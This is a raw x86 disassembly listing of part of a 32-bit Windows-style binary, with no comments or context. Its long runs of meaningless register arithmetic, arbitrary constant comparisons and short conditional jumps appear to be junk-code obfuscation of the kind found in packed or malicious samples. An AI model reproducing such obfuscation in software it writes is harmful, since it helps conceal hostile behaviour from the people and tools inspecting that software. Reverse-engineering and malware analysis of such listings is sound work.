  4041f1:	add    DWORD PTR ds:0x43b1d7,esi
  4041f7:	pop    ebx
  4041f8:	call   eax
  4041fa:	xor    ebx,ebx
  4041fc:	push   0x4b
  4041fe:	pop    DWORD PTR ds:0x43b758
  404204:	mov    esi,0x33
  404209:	xor    ebx,esi
  40420b:	mov    DWORD PTR [ebp-0x4],ebx
  40420e:	sub    DWORD PTR ds:0x43b6e8,ebx
  404214:	mov    ebx,0x0
  404219:	add    ebx,DWORD PTR ds:0x43b184
  40421f:	add    DWORD PTR ds:0x43b2d0,ebx
  404225:	add    DWORD PTR ds:0x43b6a3,ebx
  40422b:	mov    esi,eax
  40422d:	sub    esi,0x63
  404230:	mov    DWORD PTR ds:0x43b734,esi
  404236:	sub    DWORD PTR ds:0x43b3ce,esi
  40423c:	mov    esp,ebp
  40423e:	pop    ebp
  40423f:	cmp    ebx,DWORD PTR ds:0x47e157
  404245:	and    edi,esi
  404247:	inc    esi
  404248:	ret    0x18
  40424b:	imul   BYTE PTR [eax]
  40424d:	pop    es
  40424e:	add    BYTE PTR [edi+0x7f],al
  404251:	add    bh,BYTE PTR [ebp-0x7efe40f7]
  404257:	out    dx,al
  404258:	add    al,BYTE PTR [eax]
  40425a:	add    BYTE PTR [eax],al
  40425c:	mov    ecx,0xf0
  404261:	add    ebp,esi
  404263:	lea    ecx,[ebx+0x4]
  404269:	add    ecx,0x1
  40426f:	lea    eax,[ecx+0x99]
  404275:	mov    esi,ecx
  404277:	mov    edx,0x97
  40427c:	sub    edx,edi
  40427e:	add    ebp,0x2
  404284:	add    edx,ecx
  404286:	add    ebp,0x1
  40428c:	and    edi,0x62
  404292:	test   esi,edx
  404294:	jne    0x40429a
  404296:	mov    esi,edi
  404298:	mov    ebx,ecx
  40429a:	add    ebx,ecx
  40429c:	sub    ecx,0x1
  4042a2:	lea    ebp,ds:0x7
  4042a8:	or     ebx,0x1b
  4042ab:	lea    esi,[edi+0xf]
  4042b1:	add    edx,edi
  4042b3:	bsf    ebp,esi
  4042b6:	add    ecx,0x1
  4042bc:	lea    ebx,[ecx+0xd]
  4042c2:	lea    eax,ds:0x78
  4042c8:	add    edi,0x2
  4042ce:	add    edx,edi
  4042d0:	mov    ebx,0xb7
  4042d5:	lea    esi,ds:0xcb
  4042db:	add    esi,edx
  4042dd:	add    esi,0x1
  4042e3:	lea    ebp,[edi+0x1]
  4042e9:	xor    ecx,ecx
  4042eb:	lea    ebp,ds:0x5
  4042f1:	cmp    edx,DWORD PTR ds:0x45be6a
  4042f7:	add    ecx,edi
  4042f9:	add    edi,0x1
  4042ff:	xor    edx,edx
  404301:	sub    ebx,DWORD PTR ds:0x4775f0
  404307:	add    ebx,ecx
  404309:	add    ebx,0x1
  40430f:	add    edi,ecx
  404311:	setle  dl
  404314:	cmp    ebx,DWORD PTR ds:0x476f57
  40431a:	cmp    edi,0x6339bfc7
  404320:	jp     0x404323
  404322:	dec    ebx
  404323:	mov    ebp,edi
  404325:	mov    edx,0xdf
  40432a:	add    edi,0x2
  404330:	add    edx,esi
  404332:	add    ecx,0x2
  404338:	mov    edi,0xa9
  40433d:	sub    edi,0x1
  404343:	add    edx,edi
  404345:	mov    ebx,0xa7
  40434a:	sub    edx,0x1
  404350:	add    ebp,edi
  404352:	xor    edi,DWORD PTR ds:0x44bdde
  404358:	cmp    edx,DWORD PTR ds:0x4628c9
  40435e:	lea    edi,[ecx+0x79]
  404364:	sub    edi,esi
  404366:	sub    edx,ecx
  404368:	sub    esi,0x1
  40436e:	not    esi
  404370:	mov    eax,esi
  404372:	mov    ebp,0x8e
  404377:	or     ebx,0x2
  40437a:	or     edx,esi
  40437c:	sub    ebx,0x2
  404382:	mov    esi,edx
  404384:	add    ecx,0x2
  40438a:	or     ebx,0x27
  40438d:	mov    edi,0x65
  404392:	add    ecx,0x1
  404398:	mov    ecx,0xa8
  40439d:	and    ecx,0xa3
  4043a3:	xor    edi,DWORD PTR ds:0x4697b9
  4043a9:	sub    edx,ecx
  4043ab:	lea    ebx,ds:0x1c
  4043b1:	cmp    ebx,0x0
  4043b4:	jae    0x4043c0
  4043b6:	add    edi,ecx
  4043b8:	lea    edi,ds:0xf
  4043be:	or     cl,ah
  4043c0:	add    ecx,0x2
  4043c6:	sub    esi,0x1
  4043cc:	mov    eax,0x1f
  4043d1:	add    edi,ecx
  4043d3:	lea    edx,[ebx+0x8]
  4043d9:	or     ecx,DWORD PTR ds:0x43f6a5
  4043df:	sub    ebp,0x2
  4043e5:	sub    edx,DWORD PTR ds:0x4549b9
  4043eb:	dec    ecx
  4043ec:	add    ebx,edx
  4043ee:	add    edi,0x2
  4043f4:	xor    edx,DWORD PTR ds:0x44b5c6
  4043fa:	add    ebx,ecx
  4043fc:	test   ecx,edx
  4043fe:	jne    0x404402
  404400:	dec    ebp
  404401:	dec    esi
  404402:	add    ebx,ecx
  404404:	add    esi,0x2
  40440a:	or     edi,DWORD PTR ds:0x47a8a7
  404410:	add    ebx,edi
  404412:	mov    ebp,0x69
  404417:	mov    ecx,ebx
  404419:	or     esi,0x22
  40441c:	lea    edx,[ebx+0xd]
  404422:	mov    ebp,ebx
  404424:	sub    esi,ebx
  404426:	add    esi,0x1
  40442c:	cmp    edi,0xad83098f
  404432:	jns    0x404436
  404434:	sub    edi,esi
  404436:	sub    ecx,0x1
  40443c:	inc    ecx
  40443d:	cmp    edi,DWORD PTR ds:0x43de02
  404443:	or     edx,0x6a
  404446:	lea    eax,ds:0xb
  40444c:	sub    ecx,esi
  40444e:	add    ebx,0x1
  404454:	add    ebp,ecx
  404456:	sub    ecx,0x1
  40445c:	mov    esi,ebx
  40445e:	lea    ebx,[ecx+0xa]
  404464:	or     ecx,0x12
  404467:	sub    edx,0x2
  40446d:	mov    edi,ebx
  40446f:	or     esi,0x8
  404472:	cmp    ebx,0xcdbdafa3
  404478:	je     0x404487
  40447a:	add    esi,0x1
  404480:	lea    eax,[edi+0x4]
  404486:	dec    ecx
  404487:	or     edi,0x46
  40448a:	dec    ebx
  40448b:	lea    esi,[ecx+0xc]
  404491:	mov    eax,0x98
  404496:	lea    eax,ds:0xa
  40449c:	cmp    edx,0x1c
  40449f:	jb     0x4044af
  4044a1:	sub    esi,0x2
  4044a7:	lea    ebx,[esi+0x85]
  4044ad:	sub    edi,edx
  4044af:	add    edi,0x2
  4044b5:	cmp    esi,0x38
  4044b8:	jnp    0x4044c4
  4044ba:	lea    esi,[ebx+0x9]
  4044c0:	mov    esi,ebx
  4044c2:	add    edx,ecx
  4044c4:	add    ebx,0x1
  4044ca:	lea    ecx,[ebx+0xa2]
  4044d0:	setbe  dl
  4044d3:	and    esi,0xd
  4044d9:	add    ebp,0x2
  4044df:	sub    ecx,0x1
  4044e5:	lea    esi,[esi+0x6d]
  4044eb:	or     ebx,0x45
  4044ee:	sub    ecx,0x1
  4044f4:	lea    edi,ds:0x7
  4044fa:	add    ebx,esi
  4044fc:	mov    esi,ecx
  4044fe:	sub    ecx,0x2
  404504:	lea    esi,ds:0x2
  40450a:	test   edi,ebx
  40450c:	jne    0x404512
  40450e:	or     ecx,0x6c
  404511:	dec    edx
  404512:	inc    ebp
  404513:	or     edi,0x3a
  404516:	add    ecx,0x2
  40451c:	sub    ebp,0x2
  404522:	add    edx,0x2
  404528:	seto   al
  40452b:	not    ebx
  40452d:	dec    ebx
  40452e:	cmp    ecx,DWORD PTR ds:0x479552
  404534:	sub    ebx,edx
  404536:	cmp    edi,DWORD PTR ds:0x45aef3
  40453c:	sub    edi,DWORD PTR ds:0x4790cb
  404542:	add    ebx,ecx
  404544:	or     ebx,DWORD PTR ds:0x473fa8
  40454a:	lea    ebp,[edi+0x56]
  404550:	add    esi,edi
  404552:	add    ebp,edi
  404554:	add    edi,esi
  404556:	add    edx,0x2
  40455c:	cmp    esi,0xffffff8b
  40455f:	jns    0x40456d
  404561:	mov    edi,ebx
  404563:	xor    ecx,DWORD PTR ds:0x4581c7
  404569:	mov    eax,edx
  40456b:	add    edi,ecx
  40456d:	sub    ebp,ebx
  40456f:	or     edi,0x45
  404572:	or     di,bx
  404575:	add    esi,ebx
  404577:	sub    edi,0x1
  40457d:	lea    ecx,[ecx+0xa]
  404583:	mov    ebp,0xb2
  404588:	test   esi,ebx
  40458a:	je     0x40458e
  40458c:	add    ecx,edx
  40458e:	add    esi,ebx
  404590:	sub    ebp,ebx
  404592:	lea    ebp,ds:0x99
  404598:	mov    esi,0x2d
  40459d:	lea    ebp,[esi+0x5]
  4045a3:	lea    ebx,[ecx+0x1]
  4045a9:	lea    edi,[ecx+0x7b]
  4045af:	lea    ebp,[ecx+0x7]
  4045b5:	mov    ecx,ebx
  4045b7:	lea    ebx,ds:0xa
  4045bd:	add    ebx,0x1
  4045c3:	mov    esi,0xdc
  4045c8:	add    edx,esi
  4045ca:	sub    ecx,edi
  4045cc:	add    ecx,ebx
  4045ce:	add    ecx,ebx
  4045d0:	sub    ecx,0x1
  4045d6:	add    esi,0x2
  4045dc:	add    ecx,0x1
  4045e2:	sub    edi,0x2
  4045e8:	mov    eax,0x3c
  4045ed:	sub    ebx,ecx
  4045ef:	lea    esi,[edx+0x36]
  4045f5:	or     esi,DWORD PTR ds:0x44f4f9
  4045fb:	sub    ebx,0x2
  404601:	mov    edi,0x8b
  404606:	lea    esi,[ebx+0xd]
  40460c:	lea    eax,[edx+0x68]
  404612:	mov    ebp,0xb8
  404617:	add    ecx,0x2
  40461d:	sub    edx,0x1
  404623:	add    ebp,0x1
  404629:	add    ebx,0x2
  40462f:	sub    edx,ebx
  404631:	mov    ebx,0x2b
  404636:	add    esi,0x2
  40463c:	add    ebp,0x2
  404642:	lea    esi,ds:0x9a
  404648:	add    esi,ecx
  40464a:	add    ecx,edi
  40464c:	lea    ebx,[edi+0x0]
  404652:	mov    ebp,0x4b
  404657:	sub    edx,ebx
  404659:	add    esi,ecx
  40465b:	or     edx,0x5e
  40465e:	mov    edi,0x17
  404663:	or     ecx,0x30
  404666:	lea    edi,[ebx+0xd]
  40466c:	sub    ebp,0x1
  404672:	sub    ebx,esi
  404674:	mov    ebp,0xc9
  404679:	add    ebx,0x1
  40467f:	mov    ecx,0x51
  404684:	add    edi,ecx
  404686:	lea    ebp,[edx+0x9]
  40468c:	lea    ecx,[edi+0x5]
  404692:	sub    ebx,edx
  404694:	sub    edi,0x1
  40469a:	sub    edi,ecx
  40469c:	add    edx,edi
  40469e:	lea    ecx,ds:0x5
  4046a4:	sub    esi,0x1
  4046aa:	sub    ebp,DWORD PTR ds:0x469a51
  4046b0:	xor    ebx,DWORD PTR ds:0x4475ba
  4046b6:	sub    edi,0x1
  4046bc:	add    edx,ecx
  4046be:	sub    edi,DWORD PTR ds:0x45f31c
  4046c4:	lea    eax,ds:0xd
  4046ca:	add    ebx,0x1
  4046d0:	add    edx,0x2
  4046d6:	bswap  ecx
  4046d8:	sub    ecx,0x1
  4046de:	or     edi,0x15
  4046e1:	add    ecx,edi
  4046e3:	sub    ebx,esi
  4046e5:	lea    ecx,[ecx+0xe]
  4046eb:	mov    ecx,0x43
  4046f0:	lea    edi,[ebx+0x21]
  4046f6:	xor    esi,DWORD PTR ds:0x47c62d
  4046fc:	sub    edi,DWORD PTR ds:0x460a6b
  404702:	test   ebx,esi
  404704:	jne    0x404708
  404706:	add    ebp,esi
  404708:	add    edi,edx
  40470a:	add    ebx,ecx
  40470c:	sub    ebp,ecx
  40470e:	not    ebp
  404710:	mov    dx,0xc3cb
  404714:	mov    ebx,edx
  404716:	dec    edx
  404717:	lea    ebx,ds:0x6
  40471d:	bsr    edx,esi
  404720:	add    edi,0x1
  404726:	sub    ecx,ebx
  404728:	lea    esi,ds:0xf1
  40472e:	lea    eax,[esi+0xce]
  404734:	lea    ebp,ds:0xaa
  40473a:	add    ecx,edx
  40473c:	add    edi,0x2
  404742:	add    ebp,0x1
  404748:	sub    ebp,0x1
  40474e:	sub    ebx,edi
  404750:	not    edx
  404752:	cmp    ebx,0x34cdb84b
  404758:	jl     0x40475b
  40475a:	dec    esi
  40475b:	mov    ebp,0x39
  404760:	mov    bp,0x4818
  404764:	mov    esi,0x9f
  404769:	lea    ecx,[edi+0xc]
  40476f:	lea    esi,ds:0xd8
  404775:	mov    ebp,0x93
  40477a:	lea    ebx,[edi+0xb]
  404780:	or     esi,0x23
  404783:	lea    eax,[edx+0x9]
  404789:	lea    edx,[ebx+0xe]
  40478f:	add    ecx,0x2
  404795:	or     esi,DWORD PTR ds:0x48078c
  40479b:	lea    ebx,ds:0x2
  4047a1:	add    esi,0x2
  4047a7:	xor    ecx,edi
  4047a9:	sub    edx,0x2
  4047af:	mov    esi,0x45
  4047b4:	and    edx,0xda
  4047ba:	add    edi,ecx
  4047bc:	lea    edx,[ecx+0x1]
  4047c2:	mov    edx,0x21
  4047c7:	dec    edx
  4047c8:	lea    ecx,ds:0x1c
  4047ce:	add    ebx,0x1
  4047d4:	lea    ebx,[ecx+0xb]
  4047da:	sub    ecx,edi
  4047dc:	add    edi,0x2
  4047e2:	lea    ebx,[ebx+0xdf]
  4047e8:	mov    esi,0xff
  4047ed:	add    ecx,0x2
  4047f3:	and    esi,0xe
  4047f9:	sub    edx,0x1
  4047ff:	add    ebp,esi
  404801:	add    esi,ecx
  404803:	mov    ebx,0x4c
  404808:	sub    ebx,0x2
  40480e:	cmp    ebp,DWORD PTR ds:0x45fed6
  404814:	lea    edi,ds:0x9
  40481a:	mov    edx,0x8
  40481f:	add    esi,0x2
  404825:	sub    ebp,edx
  404827:	lea    ecx,[ecx+0x50]
  40482d:	lea    ebx,ds:0xa
  404833:	mov    esi,ebx
  404835:	and    edi,ebx
  404837:	mov    eax,0xe3
  40483c:	lea    edi,[edi+0xbf]
  404842:	or     ebp,0x36
  404845:	sub    edx,0x1
  40484b:	sub    esi,edx
  40484d:	lea    edi,[ecx+0xa]
  404853:	cmp    esi,0x68
  404856:	jg     0x404867
  404858:	sub    esi,0x2
  40485e:	lea    edx,ds:0x8d
  404864:	sub    edi,edx
  404866:	dec    edx
  404867:	xor    esi,ecx
  404869:	xor    ebx,DWORD PTR ds:0x47d3af
  40486f:	add    esi,0x1
  404875:	lea    ecx,ds:0x5
  40487b:	cmp    ebx,DWORD PTR ds:0x446c18
  404881:	lea    eax,[edi+0x4]
  404887:	sub    edi,ebx
  404889:	mov    eax,0x26
  40488e:	lea    ebp,ds:0x5
  404894:	sub    edi,ebx
  404896:	mov    eax,0xaa
  40489b:	lea    esi,ds:0xc
  4048a1:	and    ecx,ecx
  4048a3:	add    ebp,0x1
  4048a9:	sub    ecx,0x2
  4048af:	mov    ecx,0xeb
  4048b4:	mov    edx,0x8d
  4048b9:	mov    eax,0x9d
  4048be:	cmp    ecx,0x69d6eb5c
  4048c4:	jg     0x4048c9
  4048c6:	mov    edi,ebx
  4048c8:	dec    esi
  4048c9:	mov    esi,0x6f
  4048ce:	add    ebp,edi
  4048d0:	sub    ecx,0x1
  4048d6:	lea    ebx,ds:0x0
  4048dc:	sub    ecx,edi
  4048de:	test   ebx,edi
  4048e0:	je     0x4048e6
  4048e2:	or     edi,0x1d
  4048e5:	dec    edi
  4048e6:	and    edx,0xa1
  4048ec:	lea    ebx,[edx+0x9]
  4048f2:	mov    edx,edi
  4048f4:	add    esi,0x2
  4048fa:	lea    eax,ds:0x6
  404900:	sub    edi,esi
  404902:	mov    edx,0xa3
  404907:	add    ecx,0x1
  40490d:	sub    edi,0x2
  404913:	add    ecx,ebx
  404915:	mov    si,0xd309
  404919:	add    edi,esi
  40491b:	cmp    edx,0x5e948bf7
  404921:	jae    0x404929
  404923:	mov    dx,0xa4db
  404927:	add    ebp,edi
  404929:	lea    ebp,ds:0x6
  40492f:	sub    ecx,edx
  404931:	mov    esi,0xa0
  404936:	sub    edx,0x2
  40493c:	mov    edi,0x13
  404941:	or     si,bx
  404944:	mov    ebx,0x52
  404949:	dec    ebx
  40494a:	add    ebp,ebx
  40494c:	mov    ebx,0xf5
  404951:	lea    ebx,ds:0xba
  404957:	add    edx,0x2
  40495d:	add    ebp,esi
  40495f:	mov    esi,0xa5
  404964:	mov    ebx,0xcc
  404969:	add    ecx,0x1
  40496f:	sub    edi,0x2
  404975:	neg    edx
  404977:	mov    ebx,0xa0
  40497c:	add    ecx,edi
  40497e:	cmp    edx,DWORD PTR ds:0x45fc6c
  404984:	lea    edi,ds:0xc
  40498a:	cmp    ecx,0x7d4e87fb
  404990:	je     0x404993
  404992:	inc    edi
  404993:	sub    edi,DWORD PTR ds:0x448100
  404999:	or     ecx,ebx
  40499b:	lea    eax,[esi+0xc]
  4049a1:	add    ecx,0x2
  4049a7:	add    edx,0x1
  4049ad:	mov    ecx,edi
  4049af:	add    edi,0x2
  4049b5:	add    esi,0x2
  4049bb:	or     esi,0x43
  4049be:	lea    esi,ds:0xa
  4049c4:	add    edi,0x1
  4049ca:	sub    esi,edx
  4049cc:	sub    esi,DWORD PTR ds:0x43c395
  4049d2:	add    ecx,ebx
  4049d4:	sub    edi,0x2
  4049da:	add    ebp,edi
  4049dc:	mov    eax,0xa2
  4049e1:	dec    ebx
  4049e2:	mov    edx,0x9a
  4049e7:	mov    ebp,0xed
  4049ec:	sub    ebx,0x2
  4049f2:	add    ebx,0x1
  4049f8:	add    ebp,0x2
  4049fe:	lea    edi,[edx+0x4]
  404a04:	lea    ecx,ds:0xf5
  404a0a:	lea    edi,[esi+0xc3]
  404a10:	or     ebp,0x36
  404a13:	lea    esi,[ebx+0x33]
  404a19:	add    edx,0x1
  404a1f:	add    edx,esi
  404a21:	add    esi,0x2
  404a27:	sub    edi,edx
  404a29:	mov    ebp,edx
  404a2b:	mov    si,0x14aa
  404a2f:	lea    edx,ds:0x85
  404a35:	lea    eax,[esi+0x8]
  404a3b:	mov    eax,esi
  404a3d:	add    ebx,0x1
  404a43:	sub    edx,0x2
  404a49:	lea    eax,[edx+0x0]
  404a4f:	mov    edi,0x9c
  404a54:	cmp    edi,0xdffecf11
  404a5a:	jge    0x404a5e
  404a5c:	sub    edi,ecx
  404a5e:	add    edi,esi
  404a60:	inc    ecx
  404a61:	mov    edi,0xc3
  404a66:	and    ebp,ecx
  404a68:	add    ebp,0x1
  404a6e:	sub    edi,DWORD PTR ds:0x44a680
  404a74:	sub    ecx,0x2
  404a7a:	lea    ebp,ds:0x8
  404a80:	add    ebp,0x1
  404a86:	lea    esi,ds:0x2
  404a8c:	add    edi,esi
  404a8e:	xor    edi,edi
  404a90:	mov    edi,0xf3
  404a95:	add    ebp,0x1
  404a9b:	lea    edi,ds:0x95
  404aa1:	lea    ebx,[edi+0xbe]
  404aa7:	add    ebx,0x2
  404aad:	mov    eax,0xa1
  404ab2:	or     ebp,DWORD PTR ds:0x457fd8
  404ab8:	lea    eax,[esi+0xca]
  404abe:	add    esi,ebx
  404ac0:	xor    ecx,ebp
  404ac2:	mov    ecx,0xa7
  404ac7:	mov    ebp,edx
  404ac9:	or     ebp,DWORD PTR ds:0x46369a
  404acf:	mov    ebx,0xe9
  404ad4:	sub    ebx,edi
  404ad6:	sub    ecx,0x2
  404adc:	lea    ebp,[esi+0x1d]
  404ae2:	neg    ebp
  404ae4:	cmp    esi,DWORD PTR ds:0x447939
  404aea:	lea    esi,[ecx+0xbd]
  404af0:	sub    esi,DWORD PTR ds:0x474e1f
  404af6:	lea    ecx,[edx+0x96]
  404afc:	sub    ecx,0x2
  404b02:	lea    edi,ds:0xd
  404b08:	lea    edi,[ebx+0x42]
  404b0e:	lea    edx,[ecx+0xc]
  404b14:	mov    eax,0x58
  404b19:	not    edx
  404b1b:	mov    ecx,esi
  404b1d:	lea    ebp,ds:0x0
  404b23:	mov    edi,0xf7
  404b28:	xor    edi,edx
  404b2a:	mov    edi,ecx
  404b2c:	add    ecx,0x2
  404b32:	add    edx,0x2
  404b38:	add    edx,0x2
  404b3e:	add    ebx,esi
  404b40:	add    edx,ebx
  404b42:	or     ecx,DWORD PTR ds:0x461b94
  404b48:	mov    edi,0x1f
  404b4d:	sub    ecx,DWORD PTR ds:0x468fa2
  404b53:	mov    edi,0xdf
  404b58:	add    ebp,0x1
  404b5e:	add    esi,0x2
  404b64:	mov    ecx,0xb6
  404b69:	lea    ebp,[esi+0x6]
  404b6f:	lea    edx,[edx+0xd]
  404b75:	mov    edx,0xbc
  404b7a:	add    edi,ecx
  404b7c:	neg    ecx
  404b7e:	cmp    ecx,DWORD PTR ds:0x4578e0
  404b84:	add    edi,0x1
  404b8a:	lea    ebx,ds:0x2
  404b90:	mov    cx,0xff7c
  404b94:	mov    ebp,esi
  404b96:	test   ecx,ebx
  404b98:	je     0x404b9b
  404b9a:	inc    ecx
  404b9b:	add    edi,ecx
  404b9d:	lea    ebx,[edi+0xb2]
  404ba3:	lea    edi,ds:0x5
  404ba9:	add    edi,esi
  404bab:	cmp    edx,0x55bf8140
  404bb1:	jne    0x404bba
  404bb3:	mov    eax,0x4d
  404bb8:	mov    ebx,ecx
  404bba:	sub    ebp,0x2
  404bc0:	add    ebx,0x2
  404bc6:	mov    edx,ebx
  404bc8:	add    edi,0x2
  404bce:	add    esi,0x2
  404bd4:	setae  bl
  404bd7:	xor    esi,DWORD PTR ds:0x44b7ab
  404bdd:	cmp    ecx,0xffffffa4
  404be0:	jp     0x404bee
  404be2:	sub    edi,edx
  404be4:	dec    edi
  404be5:	sub    edi,0x1
  404beb:	btr    esi,edi
  404bee:	or     edx,DWORD PTR ds:0x46e986
  404bf4:	lea    edx,ds:0xe2
  404bfa:	mov    ecx,ebx
  404bfc:	lea    edx,[ebx+0x40]
  404c02:	lea    ebx,ds:0x22
  404c08:	cmp    si,0xeaef
  404c0d:	je     0x404c1d
  404c0f:	sub    ebp,0x2
  404c15:	lea    edx,ds:0xf
  404c1b:	add    ebx,edi
  404c1d:	mov    edi,0x53
  404c22:	add    ebp,0x1
  404c28:	neg    ebp
  404c2a:	or     ebp,0x37
  404c2d:	sub    edi,0x1
  404c33:	dec    ecx
  404c34:	lea    ebp,ds:0x62
  404c3a:	add    ebp,0x1
  404c40:	mov    eax,esi
  404c42:	lea    esi,ds:0x9
  404c48:	cmp    ecx,0xffffff8e
  404c4b:	jl     0x404c56
  404c4d:	lea    ecx,[ecx+0x43]
  404c53:	sub    ebp,esi
  404c55:	inc    ebx
  404c56:	xor    edx,DWORD PTR ds:0x477415
  404c5c:	mov    edi,0xfe
  404c61:	sub    esi,0x2
  404c67:	mov    ebx,0xb
  404c6c:	lea    ebx,ds:0xa3
  404c72:	add    ebp,0x1
  404c78:	lea    esi,ds:0x2
  404c7e:	xor    edx,ecx
  404c80:	dec    ecx
  404c81:	lea    eax,ds:0xc
  404c87:	sub    esi,0x1
  404c8d:	add    ecx,0x2
  404c93:	add    ebp,0x1
  404c99:	sub    edi,DWORD PTR ds:0x471c1d
  404c9f:	lea    ebp,ds:0xf8
  404ca5:	mov    edx,ecx
  404ca7:	or     esi,0x5
  404caa:	mov    ecx,0xc5
  404caf:	mov    edx,ebx
  404cb1:	add    ebx,0x2
  404cb7:	lea    eax,ds:0xe
  404cbd:	add    esi,edi
  404cbf:	lea    ecx,ds:0xa1
  404cc5:	lea    esi,[ecx+0x24]
  404ccb:	mov    edi,0xaa
  404cd0:	mov    ecx,0x33
  404cd5:	lea    edi,ds:0x1
  404cdb:	cmp    edx,0xffffffc6
  404cde:	jae    0x404cee
  404ce0:	or     esi,DWORD PTR ds:0x474c82
  404ce6:	mov    edx,0x62
  404ceb:	xor    ebp,esi
  404ced:	inc    ebx
  404cee:	mov    ecx,0x17
  404cf3:	cmp    esi,DWORD PTR ds:0x43f24c
  404cf9:	inc    ebp
  404cfa:	mov    eax,0x2e
  404cff:	lea    ebx,ds:0x4
  404d05:	inc    edx
  404d06:	inc    ebx
  404d07:	mov    ebp,0xfe
  404d0c:	add    ecx,ebx
  404d0e:	mov    ebx,0x67
  404d13:	lea    eax,ds:0xe
  404d19:	sub    esi,0x2
  404d1f:	lea    ebx,ds:0xb6
  404d25:	or     ebx,DWORD PTR ds:0x47eaff
  404d2b:	sub    edx,0x2
  404d31:	add    edx,esi
  404d33:	sub    edi,0x2
  404d39:	add    ebp,0x1
  404d3f:	cmp    ebx,DWORD PTR ds:0x46e23d
  404d45:	mov    ecx,edi
  404d47:	lea    ecx,ds:0xfa
  404d4d:	add    esi,ebx
  404d4f:	lea    edx,ds:0x8
  404d55:	mov    eax,0x44
  404d5a:	add    ecx,0x2
  404d60:	lea    edx,[esi+0x69]
  404d66:	lea    eax,[ecx+0xe6]
  404d6c:	add    ecx,esi
  404d6e:	add    ebx,esi
  404d70:	lea    ecx,ds:0x3d
  404d76:	add    edi,ecx
  404d78:	add    edx,ebx
  404d7a:	add    esi,0x1
  404d80:	neg    esi
  404d82:	add    ebp,ebx
  404d84:	sub    ebx,DWORD PTR ds:0x468f7c
  404d8a:	add    edx,0x1
  404d90:	lea    esi,ds:0x9
  404d96:	or     ebx,DWORD PTR ds:0x470ea5
  404d9c:	add    edx,0x1
  404da2:	lea    ebx,ds:0x3
  404da8:	lea    eax,ds:0x9
  404dae:	or     ecx,DWORD PTR ds:0x469566
  404db4:	add    ecx,0x2
  404dba:	lea    ecx,ds:0x7b
  404dc0:	mov    edi,esi
  404dc2:	add    ebx,0x2
  404dc8:	mov    esi,0x7f
  404dcd:	sub    edi,0x1
  404dd3:	lea    eax,[edx+0x9]
  404dd9:	mov    eax,edx
  404ddb:	or     ebx,0x18
  404dde:	lea    ebp,[ebx+0x16]
  404de4:	cmp    ebx,DWORD PTR ds:0x445c35
  404dea:	mov    edi,0x1d
  404def:	lea    ebx,ds:0x6f
  404df5:	or     ebp,0xe
  404df8:	mov    edi,0x6a
  404dfd:	or     esi,0x21
  404e00:	add    esi,ebx
  404e02:	xor    edi,esi
  404e04:	sbb    ebx,ebx
  404e06:	mov    ebp,0xac
  404e0b:	sub    esi,0x1
  404e11:	mov    ebx,ecx
  404e13:	add    edx,0x2
  404e19:	mov    esi,0x19
  404e1e:	xor    esi,esi
  404e20:	add    ecx,edx
  404e22:	sub    esi,0x2
  404e28:	add    esi,0x2
  404e2e:	dec    ecx
  404e2f:	cmp    esi,0x31
  404e32:	jnp    0x404e39
  404e34:	or     edx,0x3e
  404e37:	mov    ebx,esi
  404e39:	lea    edx,[edi+0xc]
  404e3f:	add    esi,0x2
  404e45:	lea    edi,[ecx+0x7f]
  404e4b:	add    esi,0x1
  404e51:	lea    edi,[ecx+0xb]
  404e57:	sub    esi,ebx
  404e59:	not    ebp
  404e5b:	add    ebx,edi
  404e5d:	cmp    edi,0xffffffba
  404e60:	jg     0x404e6f
  404e62:	or     ecx,0x6c
  404e65:	add    ebx,0x2
  404e6b:	sub    edi,edx
  404e6d:	add    ebx,edx
  404e6f:	mov    eax,edx
  404e71:	sub    esi,DWORD PTR ds:0x457dfd
  404e77:	add    edx,ebx
  404e79:	lea    ebp,ds:0x6
  404e7f:	mov    edx,0xc3
  404e84:	mov    esi,0x20
  404e89:	sub    esi,DWORD PTR ds:0x44d009
  404e8f:	or     ebx,DWORD PTR ds:0x44b18c
  404e95:	add    edx,ecx
  404e97:	add    ecx,edi
  404e99:	add    esi,ebx
  404e9b:	lea    edi,ds:0x9b
  404ea1:	sub    edi,0x2
  404ea7:	or     di,cx
  404eaa:	lea    edi,ds:0xfb
  404eb0:	mov    ecx,edx
  404eb2:	mov    esi,ecx
  404eb4:	add    ebp,edx
  404eb6:	sub    edi,0x2
  404ebc:	add    edi,0x2
  404ec2:	sub    ebp,0x2
  404ec8:	or     edx,0x51
  404ecb:	or     edi,0xe
  404ece:	lea    eax,[ecx+0x9]
  404ed4:	mov    ebx,0xfc
  404ed9:	sub    ebx,edi
  404edb:	lea    edx,ds:0xf
  404ee1:	movzx  ebp,bh
  404ee4:	sub    ebp,0x1
  404eea:	xor    ebp,DWORD PTR ds:0x457933
  404ef0:	add    ecx,0x2
  404ef6:	xor    esi,edx
  404ef8:	lea    esi,[ecx+0x33]
  404efe:	add    ebx,ecx
  404f00:	bsf    esi,ebp
  404f03:	add    ecx,edx
  404f05:	lea    edi,ds:0xe
  404f0b:	mov    ebp,0x71
  404f10:	mov    edi,edx
  404f12:	mov    ebp,0x7a
  404f17:	or     edi,DWORD PTR ds:0x450fcb
  404f1d:	sub    edx,ebx
  404f1f:	add    ecx,0x1
  404f25:	or     ebx,0x2
  404f28:	xor    edi,DWORD PTR ds:0x461ac9
  404f2e:	or     ebx,DWORD PTR ds:0x43fbf6
  404f34:	mov    ecx,0xc5
  404f39:	add    ecx,0x2
  404f3f:	xor    ebp,esi
  404f41:	mov    ebp,0xe5
  404f46:	lea    edx,[edi+0x4a]
  404f4c:	mov    eax,0x68
  404f51:	add    edi,0x1
  404f57:	lea    ecx,ds:0x67
  404f5d:	lea    eax,ds:0xff
  404f63:	mov    ecx,0x62
  404f68:	lea    ebp,[esi+0xd9]
  404f6e:	add    ebp,0x1
  404f74:	sub    ecx,edx
  404f76:	sub    ecx,0x2
  404f7c:	add    edx,0x1
  404f82:	lea    edx,[edi+0x4b]
  404f88:	sub    edx,ebx
  404f8a:	mov    ebx,edi
  404f8c:	sub    edi,0x1
  404f92:	cmp    cx,0xc398
  404f97:	jnp    0x404fa3
  404f99:	sub    edx,0x2
  404f9f:	sbb    esi,edx
  404fa1:	xor    ecx,edi
  404fa3:	lea    ebx,[ebx+0x6]
  404fa9:	add    esi,ebx
  404fab:	lea    edi,ds:0xc2
  404fb1:	lea    ebx,ds:0xe
  404fb7:	add    ebp,0x1
  404fbd:	add    esi,ebx
  404fbf:	lea    esi,[edx+0x8e]
  404fc5:	lea    edx,ds:0xe2
  404fcb:	add    edx,0x2
  404fd1:	add    esi,0x2
  404fd7:	sub    ebp,0x1
  404fdd:	cmp    esi,0x15
